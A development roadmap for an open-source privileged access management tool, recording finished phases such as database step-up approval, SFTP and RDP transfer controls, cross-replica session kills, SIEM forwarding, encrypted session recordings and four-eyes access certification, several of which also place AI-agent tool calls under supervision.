- [x] **In-session step-up on the PostgreSQL proxy**: a `PAM_DB_STEPUP_FILE` regex list marks sensitive statements; a matched statement **pauses** (audited `db.stepup_required`, surfaced on the live-monitor hub) and waits for a supervisor's decision — an **approval runs it** (`db.stepup_approved`), a **denial or timeout refuses it** (`db.stepup_denied`) — and the **session stays open** either way, unlike the kill-switch. Coordinated by a new `session.StepUp` (shared with the API, like the live `Hub`), bounded by `PAM_DB_STEPUP_TTL_SEC`
- [x] **Supervisor endpoints**: `GET /api/sessions/stepups` lists paused statements and `POST /api/sessions/{id}/stepup` decides one (`CapReadAudit` — the same gate as live monitoring, so the watching supervisor decides); audit `session.stepup_decided`
- [x] **Tests**: policy comparators (amount gating across boundary values + fail-closed on non-numeric, and fail-loud load of a bad/duplicate operator), the `session.StepUp` registry (approve / deny / timeout / one-at-a-time), a DB-proxy **end-to-end** (a matched statement pauses; approval runs it and it reaches the upstream; denial refuses it and it never reaches the upstream; the session survives both), and the API endpoints (listing + decide + 404 when nothing is pending)
- Deferred (documented): per-action step-up on the interactive SSH PTY path (a raw stream isn't parsed — the same boundary as command control) and numeric comparators over raw SQL (statements aren't structured args; step-up covers the DB path instead)

## Phase 31 — Identity blast-radius / CIEM engine ✅

The [pam-research](https://github.com/morandeirachema/pam-research) Solution-04 (identity-blast-radius) — and the third [Tier-3 competitive-coverage gap](README.md#coverage-vs-commercial-pam-cyberark-wallix-) (cloud CIEM), opened **honestly**: the analytical engine is what can be built and verified in process, so it ships complete and tested; only **live cloud ingestion** (boto3 / Okta / GitHub / Workspace API calls) needs an account and stays an external follow-on. pamv1 consumes a **normalized identity graph** an ingester produces and answers "if this identity is compromised, what can it actually reach?"

- [x] **Real AWS IAM effective-permission evaluator** (`internal/blast/iam.go`): implements the true AWS evaluation order — an explicit **Deny** anywhere wins, an **SCP** is a ceiling, a **permission boundary** is a ceiling, then an identity **Allow** grants, else implicit deny — with `*`/`?` wildcard matching (an iterative glob, so a hostile pattern can't cause catastrophic backtracking) and a condition it **cannot evaluate modeled as `uncertain`** rather than guessed. "An edge means a permission that really holds."
- [x] **Normalized identity graph + blast-radius traversal** (`internal/blast/blast.go`): a provider-agnostic graph of principals and directed edges. **Pivot** edges (`can_assume`, `member_of`, `can_escalate_to`, `credential_for`) expand an attacker's reach; **containment** edges (`contains`, `reads`) do not. `BlastRadius` (BFS, shortest path first) computes what a principal can reach; `WhoCanReach` is the reverse query. A conditional edge on a path marks the reach **uncertain**
- [x] **Toxic-combination findings + remediation-as-code**: `Findings` flags a non-admin that can pivot to an **effective admin** (privilege escalation) and any **cross-provider** pivot (lateral movement across trust domains), with **derived severity** (cross-provider + admin = critical). Each finding carries a **remediation** that cuts the **earliest** pivot edge on the path (the least-disruptive break), flagged **needs-review** when the path is uncertain
- [x] **API**: `POST /api/blast/analyze` (`CapReadAudit`) analyzes a submitted graph (4 MiB cap) and returns findings + a summary, plus an optional `source` blast-radius and `target` who-can-reach query; audited `blast.analyze`. Pure read-only analysis — no cloud credentials or persisted state
- [x] **Tests**: the IAM evaluator (explicit-deny precedence, SCP + boundary ceilings, wildcard semantics, conditional → uncertain), traversal + who-can-reach (a read edge must **not** expand reach), findings + earliest-cut remediation over a **canonical cross-provider "Drift"-shaped 4-hop chain** (a low-priv GitHub credential → Okta → an AWS deploy role → AWS admin), malformed-graph rejection (an edge to an unknown principal is fail-loud), and an API test
- Deferred (documented, infra-bound): **live ingestion** from AWS/Okta/GitHub/Workspace (needs accounts + API clients), a persisted snapshot store, and peer-baseline entitlement right-sizing — see [EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md)

## Phase 32 — SFTP file-transfer control + audit ✅

Closes an unaudited file-transfer path in the flagship SSH proxy. SFTP is not a separate protocol: it rides an SSH `subsystem` channel carrying the binary SFTP protocol ([draft-ietf-secsh-filexfer-02](https://datatracker.ietf.org/doc/html/draft-ietf-secsh-filexfer-02), the version-3 dialect OpenSSH speaks). Before this the proxy forwarded that stream **opaque** — an operator could move files with no audit trail, no policy gate, and no deny knob; the bytes merely garbled the session recording, which command control (exec-path only) never covered.

- [x] **SFTP inspector** (`internal/proxy/sftpguard.go`): sits on the operator→target leg (a new `pumpRequests` `onSubsystem` hook plus a per-session `pump` replacing the raw `io.Copy`), frames each SFTP request packet directly (no third-party SFTP dependency — an iterative parser over the wire format), and **fails open on forwarding but loud on auditing** (an unframable stream is passed through and flagged `sftp.parse_error`, never silently dropped)
- [x] **Policy `PAM_SSH_SFTP`** ∈ {`allow`, `readonly`, `deny`} (fail-loud on a typo): **`allow`** (default) forwards but now **audits every operation** (`sftp.session`, `sftp.open` with read/write intent, `sftp.modify` for remove/rename/mkdir/rmdir/setstat/symlink); **`readonly`** refuses any mutating op by **synthesizing an `SSH_FXP_STATUS` permission-denied** to the client (`sftp.blocked`) so the target is never contacted, while reads still flow; **`deny`** refuses the subsystem outright (`sftp.denied`). A non-sftp subsystem is audited `session.subsystem` (refused under `deny`)
- [x] **Tests**: a **real minimal SFTP client + server** exchange genuine v3 packets through the proxy — `allow` forwards an upload to the target and audits it, `readonly` returns permission-denied for both an upload and a delete (neither reaches the target) yet a download still succeeds, `deny` refuses the subsystem — plus the config-enum mapping. New audit vocab `sftp.*` + `session.subsystem`; no schema change
- Deferred (documented): **per-file content recording** of transferred bytes — still open; the **path allow/deny list** has since shipped in Phase 51 (`PAM_SSH_SFTP_DENY_FILE`). **Read-only enforcement for interactive shell file tools** (`scp`/shell redirection) stays inherent to the exec-path-only limit of command control

## Phase 33 — RDP clipboard control ✅

The RDP counterpart to Phase 32. The in-portal RDP viewer relies on [Apache Guacamole](https://guacamole.apache.org/doc/gug/configuring-guacamole.html#rdp), which leaves the **clipboard bridge on in both directions by default** — so an operator could copy data out of (or paste into) a recorded RDP session with no gate and no audit, and Guacamole's drive-redirection could mount a client folder as a file channel. A PAM must be able to restrict the session clipboard (a standard PSM control).

- [x] **`PAM_RDP_CLIPBOARD` policy** (`internal/api/rdp_handlers.go` `rdpClipboardParams`, threaded into the guacd `connect` handshake via `rdpExtra`): **`allow`** (default) leaves copy + paste on; **`readonly`** blocks paste *into* the target (`disable-paste=true` — no clipboard injection) while copy-out stays on, mirroring SFTP read-only; **`deny`** turns the clipboard off both ways (`disable-copy=true`+`disable-paste=true`). Every mode also forces **`enable-drive=false`**, so no file can be exfiltrated through a mounted client drive regardless of guacd's defaults
- [x] **Audited**: the chosen mode rides the `rdp.connect` audit detail (`clipboard:<mode>`); config `PAM_RDP_CLIPBOARD` ∈ {allow, readonly, deny} is validated fail-loud
- [x] **Tests**: the mode→parameter mapping (allow/readonly/deny/unset), that drive redirection is always disabled, and an **end-to-end** assertion that a `deny` policy reaches a fake guacd as `disable-copy=true`/`disable-paste=true`/`enable-drive=false` in the advertised arg order. No new audit vocab, no schema change
- Deferred (documented): **clipboard-content auditing** has since shipped in Phase 50 (`PAM_RDP_CLIPBOARD_AUDIT`, modes `off|meta|full`), and the **per-target** clipboard override shipped 2026-07-29 (`Target.RDPClipboard[Audit]`, strictest-of-global-and-target)

## Phase 34 — HA live-session kill-switch ✅

Closes an HA **correctness** gap. The live-session registry is per-replica — each pod holds the cancel funcs for the sessions it hosts — so a kill issued to one pod could not terminate a session pinned to another. That silently broke the kill-switch, the revoke cascade, vendor offboarding and the analytics auto-response in any multi-replica deployment. (The periodic-job scheduler already had leader election via a Postgres advisory lock; this is the session-registry half.)

- [x] **Cross-replica kill bus** (`internal/session/killbus.go` — `KillBus`, `KillSelector`): a kill published on any replica is delivered to every replica's subscriber, which applies it to its own registry. `Registry.Kill`/`KillByActor`/`KillByActorTarget` broadcast; a private `killLocal*` variant applies an inbound kill **without re-publishing**, so it can't loop
- [x] **Store transport**: Postgres **`LISTEN`/`NOTIFY`** (`pgstore/killbus.go` — a hijacked dedicated connection that reconnects on failure) and an **in-process fan-out hub** for the memory store (`memstore/killbus.go`), so the demo and unit tests drive the same registry code the HA path does. New store methods `PublishSessionKill`/`SubscribeSessionKills`
- [x] **API**: `DELETE /api/sessions/{id}` returns **202 Accepted** when the kill is broadcast to the cluster (the session is not on this replica) vs **204** when killed locally; `main` calls `Registry.StartKillBus(ctx, store)` at startup
- [x] **Tests**: two registries sharing one store prove a kill on "replica B" terminates a session on "replica A" (by id, by actor, by actor+target); a store-contract round-trip exercises pgstore's real `NOTIFY` in CI
- Deferred (documented): **cross-replica live monitoring** — the SSE watch stream is still served from the pod hosting the session (fanning session *bytes* across replicas is a heavier pub/sub than a kill signal). Session **inventory** listing also stays per-replica. The security-critical action — termination — is now cluster-wide. *Both since shipped in Phase 55: an interest-gated frame relay and a shared session inventory over the same store transport*

## Phase 35 — Audit→SIEM push forwarding ✅

pamv1 could already *alert* on a specific event (`internal/alert`: webhook/syslog/email) and *export* the trail on demand (OCSF at `GET /api/audit/ocsf`), but it could not **continuously stream the whole audit trail** to a SIEM the way a commercial PAM feeds Splunk/QRadar/Sentinel. This closes that.

- [x] **Continuous forwarder** (`internal/auditfwd`): tails `audit_events` from a **durable cursor** — the last-forwarded id, persisted as a setting — and emits each event as an **RFC 5424 syslog** message (PRI 110 = the log-audit facility) or an **ArcSight CEF** record, to a UDP or TCP collector. New store read `AuditSince(afterID, limit)`
- [x] **Spool-and-retry**: the cursor advances only *after* an event is written to the collector, so a dropped connection re-sends from the last success on the next tick — no silent loss. On first enable it starts from the current head (it does not replay the entire history into the SIEM)
- [x] **HA-safe**: the forward pass runs under the Postgres **leader lock**, so N replicas don't each emit duplicate SIEM records
- [x] **Injection-safe**: actor/action/detail are CR/LF-stripped (and CEF metacharacters escaped), so a directory-supplied name carrying a newline can't forge an extra syslog record
- [x] **Config** `PAM_AUDIT_FORWARD_ADDR` (host:port; empty = off), `PAM_AUDIT_FORWARD_PROTO` (udp/tcp), `PAM_AUDIT_FORWARD_FORMAT` (rfc5424/cef), `PAM_AUDIT_FORWARD_INTERVAL_SEC` — validated fail-loud
- [x] **Tests**: a real in-process UDP syslog sink receives forwarded RFC 5424 and CEF messages; the cursor advances (a second flush sends nothing); a "restarted" forwarder resumes from the persisted cursor without replaying; the store contract covers `AuditSince` (pgstore in CI)
- Deferred (documented): **LEEF** (QRadar) as a third format (trivial to add on the same seam), and **TLS syslog** (RFC 5425) for the transport — both since shipped in Phase 47

## Phase 36 — Retention / pruning ✅

Two data stores grew without bound: **session recordings** on disk and **audit rows** in Postgres. A PAM needs a defined retention policy (NIS2/SOC 2/DORA all expect one) and an operator needs the disk/table not to grow forever. This adds a scheduled, leader-locked sweep — without ever silently weakening the audit trail's tamper-evidence.

- [x] **Recording retention** (`internal/maint.PruneRecordings`): deletes `.cast`/`.winrm.log` files older than `PAM_RECORDING_RETENTION_DAYS`, **preserving dotfiles** — notably the `.chain` head that anchors the recordings' hash chain — and any non-recording file, so a sweep can never corrupt the chain or touch an unrelated file. Audited `recording.pruned`
- [x] **Audit-row retention** (`store.PruneAuditBefore`): deletes audit events older than `PAM_AUDIT_RETENTION_DAYS`, audited `audit.pruned` — **but only when the tamper-evident HMAC chain is off**. Deleting the chain head breaks `VerifyAuditChain` (it requires the first row's `prev_hash` to be nil), so with the chain on the worker **skips audit pruning with a loud warning** rather than trade integrity for space (the correct pattern there is a WORM export + manual re-anchor)
- [x] **Leader-locked worker** (`RunRetentionWorker`, `PAM_RETENTION_INTERVAL_HOURS`, default 24) — one replica sweeps per tick, like the other background jobs. Both windows default to `0` = keep forever, validated fail-loud
- [x] **Tests**: `PruneRecordings` (old removed; the `.chain` head, recent recordings, and non-recording files preserved; a dotfile-`.cast` is never touched); the store contract (`PruneAuditBefore` — a future cutoff prunes all, a past cutoff prunes none); the worker pass (recordings pruned + audited, audit pruned when unchained, and **skipped when chained**)
- Deferred (documented): **archive-to-WORM before delete** has since shipped in Phase 49 (`PAM_RETENTION_ARCHIVE_DIR`), which also resolved the chain-on case by archiving without pruning

## Phase 37 — Gap-analysis pass: child-resource scoping + bearer auth failures ✅

A read-only sweep over the route→capability map, the child-resource handlers and
the four authentication surfaces, comparing them against each other. Two
authorization gaps and one missing control; the same sweep's phase-sized findings
are recorded in [docs/SECURITY-GAPS.md](docs/SECURITY-GAPS.md#open-findings-from-the-2026-07-26-sweep)
rather than half-built here.

- [x] **Child-resource deletes are scoped to their parent**: `deleteSafeMember`
  authorized the safe in the path and then deleted by the member's *global* id, so a
  delegated `can_manage` member of one safe could remove a member of **any** safe —
  delegated administration as a lever to strip access anywhere. It now requires the
  member to belong to that safe. `deleteDependency` ignored its `{id}` credential
  entirely; it is now scoped the same way, and the audit detail names the owning
  credential. Both now follow `deleteTargetGrant`/`deleteAppSecretGrant`, which
  already scoped correctly
- [x] **Failed bearer credentials are throttled and audited on every surface**: only
  the login endpoints and the two session proxies did this, so a wrong `X-API-Key`,
  agent key or **application** key was merely logged — token guessing against
  `/api/*`, `/v1/tool-calls` and `/v1/app-secrets` (the last vends plaintext secrets
  to machines) was an unthrottled online oracle, and invisible to the risk engine and
  the SIEM forwarder because neither sees anything that is not in the audit trail. One
  `Server.authFailed` now covers all three: a per-source-IP **failure** limiter (its own
  window on the existing `PAM_AUTH_RATE_LIMIT` budget — separate from the login
  limiter, since a legitimate API client makes many *successful* calls a minute)
  answers 429 past the budget, and each admitted failure appends `api.auth_failed`
  (`surface:api|agent|app`, method, path, client IP — never the presented credential).
  The append is skipped once throttled, so a flood cannot amplify into the audit trail
- [x] **Tests**: a cross-safe member delete refused with the victim surviving (plus a
  positive control that in-safe deletion still works), a cross-credential dependency
  delete refused, and 401×N-then-429 with exactly N events audited on each of the
  three bearer surfaces. No schema change, no new environment variable
- Deferred (documented in SECURITY-GAPS.md, each phase-sized) — **all seven have
  since shipped, in Phases 38–46**: recording encryption at rest (41), shared
  custody of the SSH host/CA keys in HA (42), command control on the REST WinRM
  and broker exec paths (38), the WinRM endpoint's absence from the session
  registry (40), `CapApprove` for step-up and certification decisions (39), the
  console-parity drift since Phase 25 (43, 45), and update endpoints +
  pagination (44)

## Phase 38 — Command control on every command path ✅

The first of the [open findings](docs/SECURITY-GAPS.md#open-findings-from-the-2026-07-26-sweep)
Phase 37 recorded. Phase 16 described command control as covering "every path
where a discrete command is visible" — but the guard lived inside
`internal/proxy` and was consulted only there. Two paths that *do* see a discrete
command never asked it: `POST /api/targets/{id}/winrm` (any `CapConnect` holder)
and the agent broker's `ssh_exec` / `winrm_exec` tools. A pattern that stopped an
operator's `ssh target "cmd"` did nothing to an AI agent — the least-trusted
actor on the system.

- [x] **One guard, one policy** (`internal/cmdguard`): the denylist moves out of
  `internal/proxy` into its own package (`Guard`, `New`, `ParseDeny`, `Blocked`,
  `Size` — same logic, its tests moved with it). `main` compiles
  `PAM_COMMAND_DENY_FILE` **once** and hands the same guard to the SSH proxy, the
  PostgreSQL proxy and the API server, so the two can't drift apart
- [x] **Enforced on the API's command paths**: `Server.guardCommand` is called from
  `execWinRM` — the single chokepoint the REST endpoint and the broker's
  `winrm_exec` share — and from `sshExecTool.Execute`. Both run **before** the
  just-in-time decrypt, so a refused command never causes a secret to exist in
  memory. A block is audited `command.blocked` with the matched pattern (the same
  vocabulary the proxies use, so one query finds every refusal) and answers HTTP
  403 to a human / a failed tool call to an agent
- [x] **Tests**: a blocked WinRM run is refused with 403, never reaches the fake
  runner, never decrypts the credential, and is audited — while an unmatched
  command still runs; the same for an agent calling `winrm_exec`; and a blocked
  `ssh_exec` against an unroutable host returns the *policy refusal* rather than a
  dial error, which proves the guard runs before the dial
- Unchanged by design: an interactive SSH shell streams a raw PTY that is never
  parsed, so command control still must not be read as a containment boundary —
  use read-only observer sessions or restrict shell access where that guarantee is
  needed. No schema change, no new environment variable

## Phase 39 — Approver capability for the two decision points ✅

Findings **E** and **F** of the [2026-07-26 sweep](docs/SECURITY-GAPS.md#open-findings-from-the-2026-07-26-sweep).
Two endpoints that *authorize* something were gated on the wrong capability — one
too permissive, one too narrow — and `CapApprove` already existed for exactly this
kind of decision.

- [x] **Step-up release needs `CapApprove`** (was `CapReadAudit`): pausing a flagged
  PostgreSQL statement for a supervisor is only meaningful if releasing it is a
  privileged act. As shipped in Phase 30 the role defined as *read-only* — `auditor`
  — could run it. `GET /api/sessions/stepups` **keeps** `CapReadAudit`, the same gate
  as the live stream, so a watching supervisor still sees every paused statement;
  only `POST /api/sessions/{id}/stepup` moved
- [x] **Certification decisions need `CapApprove`** (was `CapManageUsers`): recertifying
  access is a review, not user administration. Requiring the user-management
  capability meant the principal who grants access was the only one who could attest
  to it — the opposite of what a SOX / ISO 27001 review is for. An `approver` can now
  certify or revoke items **without** holding any access-granting capability; creating
  and closing a campaign stay `CapManageUsers`
- [x] **Tests**: an auditor lists paused step-ups but is refused the release (403) while
  an approver's decision resolves the waiting statement; an approver decides a campaign
  item (204) yet still cannot create a campaign, and neither an auditor nor a plain user
  can decide
- Honest limit (documented): this **delegates** the review — it does not by itself stop
  an admin, who also holds `CapApprove`, from certifying a grant they created. Per-item
  four-eyes needs the grant's creator recorded, which is a schema change and stays a
  follow-on. No new capability, no schema change, no new environment variable

## Phase 40 — Every brokered execution is a supervised session ✅

Finding **D** of the [2026-07-26 sweep](docs/SECURITY-GAPS.md#open-findings-from-the-2026-07-26-sweep),
plus the same hole one layer over. The SSH proxy, the PostgreSQL proxy and the RDP
tunnel all registered their sessions; `POST /api/targets/{id}/winrm` did not — and
neither did the agent broker's `winrm_exec` / `ssh_exec` tools. A run on those paths
was invisible to `GET /api/sessions`, could not be killed, was not counted against
`PAM_MAX_SESSIONS_PER_USER` / `_TOTAL`, and was out of reach of the analytics
auto-response and the vendor sweeper — both of which terminate **by actor**. An
agent's long-running command was the least supervisable execution in the system.

- [x] **One helper, every path** (`Server.superviseSession`): enforces the
  concurrent-session caps, registers the session, and returns a context a kill
  cancels plus a release func. The REST WinRM endpoint and both broker exec tools
  now go through it, so an AI agent's run is exactly as listable, countable and
  killable as an operator's
- [x] **Capped before the decrypt**: the cap check runs *before* the just-in-time
  decryption on every path (`ssh_exec`'s decrypt was moved after it), so a run
  refused by the limit never causes a secret to exist in memory
- [x] **A kill is honest about itself**: cancelling the run returns HTTP **503
  session terminated** and audits `session.killed`, rather than blaming the target
  for an upstream failure
- [x] **Tests**: an in-flight WinRM run parks in a blocking runner and is observed
  in `GET /api/sessions` as protocol `winrm`; a second concurrent run is refused
  **429** by the per-actor cap; `DELETE /api/sessions/{id}` terminates the run, which
  returns 503; the registry empties afterwards; and the runner still received the
  vaulted secret, so JIT injection is unchanged
- No schema change, no new environment variable — `PAM_MAX_SESSIONS_*` simply now
  means what it says on every path

## Phase 41 — Session recordings encrypted at rest ✅

Finding **A** of the [2026-07-26 sweep](docs/SECURITY-GAPS.md#open-findings-from-the-2026-07-26-sweep),
and the oldest real asymmetry in the project: pamv1 wrapped every credential in
envelope encryption under a pluggable KEK, then wrote the **recording of the
session** — which holds whatever the operator typed and saw, including a secret
typed by hand, a query result, or a file listed on screen — in the clear, protected
by file permissions alone. Anyone with volume, backup or snapshot access could read
it. This closes that, opt-in via `PAM_RECORDING_ENCRYPT`.

- [x] **A sealed stream, not a sealed blob** (`internal/recording`): a header line
  carrying the vault-wrapped per-recording data key, then AES-256-GCM chunks. It is
  chunked because a session can be killed, hit its size cap or die with the process
  — a partial file must still decrypt up to its last complete chunk rather than be
  lost whole. Each chunk's additional authenticated data binds it to the
  recording's name **and its index**, so chunks cannot be reordered, dropped from
  the middle, or spliced in from another recording
- [x] **Same root of trust as the vault**: the data key is wrapped by the configured
  KEK — local, HashiCorp Vault Transit, AWS KMS or a PKCS#11 HSM — so a deployment
  whose master key never leaves an HSM now protects its recordings that way too
- [x] **Tamper evidence unchanged**: the SHA-256 is deliberately taken over the bytes
  that land **on disk**, so the audited hash, the `X-PAM-Recording-Audited` verdict
  and the recording hash chain keep describing the stored artifact with no change to
  any of them. The WinRM transcript path was hashing its *plaintext* — identical
  while unencrypted, silently wrong once sealed — and now hashes the stored bytes
- [x] **Fails closed, never silently clear**: a KEK that cannot wrap the data key
  returns an error and leaves no file behind, so a session can be refused rather
  than recorded in the open by accident
- [x] **Detected per file, not by config**: playback sniffs the magic prefix, so
  turning encryption on does not orphan the recordings a deployment already had —
  they keep replaying through the same audited path
- [x] **Tests**: the package (round-trip with the plaintext provably absent from the
  file, a flipped bit caught as an authentication failure with the intact prefix
  still recoverable, a chunk refused under another recording's name, a truncated
  file readable up to its last complete chunk, a loud KEK failure); the proxy
  recorder (a session's `.cast` is sealed on disk and `Close` reports the hash of
  the stored bytes); and end to end (a recorded WinRM run leaks neither its command
  nor its output nor the target to disk, yet replays through the API with
  `X-PAM-Recording-Audited: true`, while a pre-encryption recording still replays)
- Honest limit, documented: the **file name** still carries the target and the actor.
  The content is sealed; that metadata is not. Naming recordings by opaque id is a
  follow-on, and would cost the operator the ability to find a session by eye

## Phase 42 — Shared custody of the host and CA keys (HA) ✅

Finding **B** of the 2026-07-26 sweep. `proxy.LoadOrCreateHostKey` and
`sshca.LoadOrCreate` persisted to a **local file**, while the Helm PVC is
`ReadWriteOnce`, defaults to `emptyDir`, and `replicaCount` is freely configurable.
Nothing stopped a second replica starting — and when it did, each pod generated
its own keys, so:

- operators got a **host-key-changed warning** depending on which pod answered,
  which is indistinguishable from a MITM and trains people to click through it;
- a certificate minted on one pod was **not trusted** by targets configured with
  another pod's `TrustedUserCAKeys`, and `GET /api/ca/ssh` returned a different key
  per pod;
- the operator-certificate challenge — an HMAC keyed off the CA private key, and
  documented as "HA-safe across replicas" — **failed across pods**, which was only
  true if that key were shared.

- [x] **Atomic claim in the store** (migration `0022` `key_material`,
  `store.EnsureKeyMaterial`): `INSERT … ON CONFLICT DO NOTHING` followed by a read
  back, so N replicas starting at the same instant all converge on **one** key —
  exactly one wins, the rest adopt. The memory store takes the same lock-guarded
  path, and the contract test races six claimants against live PostgreSQL in CI
- [x] **Sealed, and bound to its name** (`internal/keycustody`): the database holds
  the vault envelope, never usable key material, with
  `store.KeyMaterialAAD(name)` so a host-key envelope cannot be substituted for the
  CA key
- [x] **An existing file seeds custody, it does not lose to it**: a single node that
  upgrades keeps serving the key it already had — that key becomes the shared one —
  and later replicas adopt it and mirror it back to their own path, so tooling that
  reads the file keeps working. Adoption is logged, because it is the moment a
  deployment stops having two host keys
- [x] **A key that cannot be unwrapped is fatal**, never a silent regeneration:
  quietly rotating the host key or the CA would break every target that pinned them,
  so the error names the likely cause (a changed master key) and startup stops
- [x] **Tests**: eight concurrent replicas converge on one key; an existing file
  seeds custody and a second replica adopts + mirrors it; the store holds no usable
  key material and the envelope refuses the other key's AAD; an unwrappable key is
  fatal and returns no key; a failing generator propagates
- Still open (recorded, not closed by this): **recordings remain per-pod**, so
  `GET /api/recordings` lists what the serving replica holds — shared recording
  storage is an operator decision (RWX volume or object storage) rather than a code
  fix. Cross-replica live monitoring, then the Phase 34 follow-on, has since
  shipped (Phase 55)

## Phase 43 — Console: the two human decision points ✅

The first half of finding **G**. Phase 25 brought the 5250 console to full backend
parity and Phases 27–42 drifted away from it again — nine capabilities ended up
with no screen. Two of them are not like the others: **a parked agent tool call**
and **a paused SQL statement** are *human decisions with a deadline*. A step-up is
refused when `PAM_DB_STEPUP_TTL_SEC` runs out; a parked call blocks an agent until
someone answers. Leaving those two on curl-only was the part that actually cost
something, so they ship first rather than waiting for a nine-screen phase.

- [x] **Approve AI-agent tool calls** (menu 20, `approve`): the parked call, the
  agent, who it acts **on behalf of**, the rule that gated it — and its
  **arguments**, because the arguments are what the policy matched on and an
  approver who cannot see them is not really deciding. Option 5 approves (the
  broker then executes server-side with a just-in-time credential the agent never
  sees), option 6 rejects. The screen states the two rules that will refuse a
  decision: four-eyes (you cannot approve a call by an agent you own) and the
  rule's approver groups. With the broker disabled the routes are absent, so a 404
  shows a hint instead of an error — the pattern the application-secrets screen
  already uses
- [x] **In-session step-up decisions** (menu 21, `read_audit` to watch, `approve`
  to decide — the Phase 39 split): the paused statement, its session and actor.
  Option 5 allows it, option 6 refuses it, and the screen says plainly that these
  entries **expire** and that the session survives either way, because that is the
  one thing a supervisor needs to know and cannot infer from a list
- [x] **Verified against a running server**, the way Phase 25 was: a real agent key
  minted, a real `list_targets` call parked by a `require_approval` rule, the exact
  `GET /v1/approvals` the screen issues returning every field it renders, the exact
  decision `POST` returning 200, and the list emptying afterwards — plus the
  step-up list and the broker-disabled 404. `node --check` on the embedded script
- Portal-only: no new routes, no schema, no new environment variable

## Phase 44 — Editable objects and bounded lists ✅

*Finding H*, the last data-shaped gap from the 2026-07-26 sweep. The `Store`
interface had create and delete but **no update** for targets, safes, users or
vendors — fixing a target's port meant delete + recreate, which cascades away
its credentials, grants, dependencies and safe assignment, a data-loss footgun
in ordinary administration — and no top-level list read was bounded, an
authenticated memory-exhaustion vector on a large inventory.

- [x] **Edit in place**: `UpdateTarget` (name/host/port/os/protocol/approval —
  never the safe assignment, which stays `AssignTargetSafe`'s), `UpdateSafe`,
  `UpdateUserRole` and `UpdateVendorOrg` store methods (`ErrNotFound` /
  `ErrConflict` on a name collision), surfaced as `PUT /api/targets/{id}`,
  `/api/safes/{id}` (CapManageTargets), `/api/users/{id}` and
  `/api/vendors/{id}` (CapManageUsers) with **create-equivalent validation and
  authorization** — the user edit re-runs the privilege-escalation guard, so a
  delegated user-admin cannot promote past their own capabilities, and the
  user's token **survives** a role change (no re-mint). Audited
  `target.update` / `safe.update` / `user.update` / `vendor.update`
- [x] **Deliberately not editable**: grants and safe members stay
  create + delete — they have no dependents to lose, and two audited events
  (deleted, created) are a clearer trail than one mutated row. Usernames are
  immutable (the subject key referenced by grants, sessions and vendor rows)
- [x] **Bounded lists**: `ListTargets`, `ListCredentials`, `ListUsers`,
  `ListSafes`, `ListCheckouts`, `ListAccessRequests` and `ListVendors` take a
  shared `(limit, afterID)` window — id-ascending, strictly after the cursor;
  `limit<=0` (uncapped) is reserved for in-process sweeps. Every list endpoint
  parses `?limit=&after=` clamped 1..500, default 100, the way `listAudit`
  already was — a hostile `?limit=0` falls back to the default, never to
  "return everything"
- [x] **Console**: the subfiles drain the cursor page by page (`apiAll`), and
  Work with Targets / Safes / Users gain **2=Change** screens
  (`PAMCHGTGT`/`PAMCHGSAF`/`PAMCHGUSR`); the target forms now offer
  `postgres`, which the console had drifted from
- [x] **Proven in the store contract** (both stores; live PostgreSQL in CI):
  update round-trips, conflict/absence sentinels, safe-assignment preservation
  across an edit, window semantics — plus five API tests (dependents survive a
  target edit; a promoted token immediately carries the new role; pagination
  clamps)
- No schema change, no new environment variable

## Phase 45 — The remaining console screens ✅

The other half of finding **G**, closing it. Seven capabilities had a backend,
tests and docs but no screen — an operator drove them with curl. All seven are
now first-class 5250 screens, keyboard-first, in the single embedded page:

- [x] **Work with vendors & contract grants** (menus 22): register (token shown
  once), 2=Change org, 4=Offboard (shows how many sessions were cut),
  5=contract grants — add a grant (target picker, account, `datetime-local`
  window), 5=Approve (`CapApprove`; the screen states four-eyes: a customer,
  never the vendor) and 6=Revoke — and 6=Evidence export, a real download
  carrying the `X-PAM-Export-SHA256` digest into the message line
- [x] **Work with operator SSH certificates** (menu 23): every issued cert with
  serial, key id, principal, operator, validity and revocation state;
  4=Revoke; F9 downloads the KRL; the CA fingerprint heads the screen, or an
  amber "ZSP not enabled" hint when there is no CA — certs stay revocable
  either way
- [x] **Identity blast radius** (menu 24): paste a normalized graph (the
  placeholder is a valid example; the edge-kind vocabulary is on screen),
  optional source/target focus, and the findings render with severity, path
  (`from ─kind:via→ to`) and the cut-this-edge remediation hint
- [x] **Work with login sessions** (menu 25): active password/SSO logins with
  role(s), scope and expiry; 4=Revoke reports both logins revoked and live
  target sessions cut
- [x] **Work with AI-agent keys** (menu 26): mint (token shown once, owner
  mandatory — the accountable human), revoke; broker-disabled shows the
  configuration hint, the app-secrets pattern
- [x] **Credential dependencies**: option **9=Dependents** on Work with
  Credentials — list, declare (kind/name/host/port) and delete the consumers
  updated on rotation
- [x] **Audit chain + OCSF on the audit screen**: F6=Verify chain (INTACT /
  BROKEN AT id banner), F7=Signed head (a screen rendering the ed25519
  checkpoint: last id, head HMAC, signature, public key, and why to archive
  it), F10=OCSF export (download); F9 CSV stays
- [x] **One deliberate deviation from "no new routes"**: `GET
  /api/ca/ssh/certs` (CapReadInventory, `?limit=` clamped 1..500) — the store
  could list issued certificates but no route exposed them, so the serials a
  revocation needs were invisible outside the audit trail. Metadata only,
  never key material. Test: `api.TestListSSHCertsEndpoint`
- [x] **Verified against a running server** (broker + audit chain + checkpoint
  signing enabled): vendor registered → grant added → approved → evidence
  digest header; agent minted → listed → revoked (204); blast analyze
  returning a real `high` finding with path + remediation; audit verify
  `ok:true`, head with every rendered field, OCSF 200; the CA-disabled hint;
  `node --check` on the embedded script

## Phase 46 — Per-item four-eyes on certification ✅

The Phase 39 follow-on, closing the last separation-of-duties gap (finding
*F*'s honest limit): delegating the review to `CapApprove` did not stop the
principal who **granted** access from **certifying** it themselves — the
reviewer and the grantor could be the same person, which is what an access
review exists to prevent.

- [x] **The grant's creator is recorded**: `target_grants.created_by` and
  `safe_members.created_by` (migration `0023`), stamped from the authenticated
  actor on every create. Rows that predate the migration keep an empty creator
  — four-eyes cannot be enforced retroactively on grants whose creator was
  never recorded, and pretending otherwise would block every legacy review
- [x] **Snapshotted into the campaign item** (`campaign_items.granted_by`), so
  the decision check needs no live lookup and still works after the underlying
  grant is deleted; the item's human-readable detail says *"granted by X"*, so
  the reviewer sees who they are attesting for — in the console too, with no
  screen change
- [x] **Enforced at the decision**: certifying an item whose recorded creator
  is the deciding actor is refused 403 (*"four-eyes: you cannot certify access
  you granted yourself"*) and audited `certification.decision_denied`
  (`reason:four-eyes`). **Self-revoke stays allowed** — removing your own
  grant only reduces access
